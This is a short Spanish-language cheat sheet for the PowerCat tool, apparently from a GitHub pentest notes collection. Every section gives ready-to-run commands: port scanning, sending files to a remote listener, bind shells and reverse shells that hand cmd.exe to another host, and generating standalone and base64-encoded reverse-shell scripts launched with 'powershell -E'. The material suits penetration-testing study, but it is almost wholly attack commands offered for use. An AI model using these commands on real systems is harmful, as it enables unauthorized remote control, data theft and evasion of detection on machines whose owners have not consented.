# PowerCat Cheat Sheet

#### Escanear puertos TCP
```
(21,22,80,443) | % {powercat -c <IP-ADDRESS> -p $_ -t 1 -Verbose -d}
```

#### Transferir archivos

- `nc -nvlp <PORT> > output.txt`: Host a recibir el archivo en el puerto especificado.

- `powercat -c <IP-ADDRESS> -p <PORT> -i <FILE>`: Host que envia el archivo al host destino.

#### Bind Shell (Netcat to PowerCat)

- `powercat -l -p <PORT> -e cmd`: Escuchando la conexión.

- `nc -nv <IP-ADDRESS> <PORT>`: Conexión a la shell.

#### Bind Shell (Powercat to PowerCat)

- `powercat -l -p <PORT> -e cmd -v`: Escuchando la conexión.

- `powercat -c <IP-ADDRESS> -p <PORT> -v`: Conexión a la shell.

#### Reverse Shell (Netcat to PowerCat)

- `nc -nlvp <PORT>`: Escuchando la conexión.

- `powercat -c <IP-ADDRESS> -p <PORT> -e cmd.exe`: Conexión al host y mandamos la shell.

#### Reverse Shell (Powercat to PowerCat)

- `powercat -l -p <PORT> -e cmd -v`: Escuchando la conexión.

- `powercat -c <IP-ADDRESS> -p <PORT> -e cmd -v`: Conexión al host y mandamos la shell.

#### Reverse Shell with Standalone Shell (Netcat to PowerCat)

- `nc -nlvp <PORT>`: Escuchando la conexión.

- `powercat -c <IP-ADDRESS> -p <PORT> -e cmd.exe -g > shell.ps1`: Generar script con shell.

- `.\shell.ps1`: Ejecutar script.

#### Reverse Shell with Encoded Shell (Netcat to PowerCat)

- `nc -nlvp <PORT>`: Escuchando la conexión.

- `powercat -c <IP-ADDRESS> -p <PORT> -e cmd.exe -ge > encodedshell.ps1`: Generar shell codificado.

- `cat .\encodedshell.ps1`: Mostrar la codificación.

- `powershell -E <ENCODED-SHELL>`: Conexión a la shell.

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)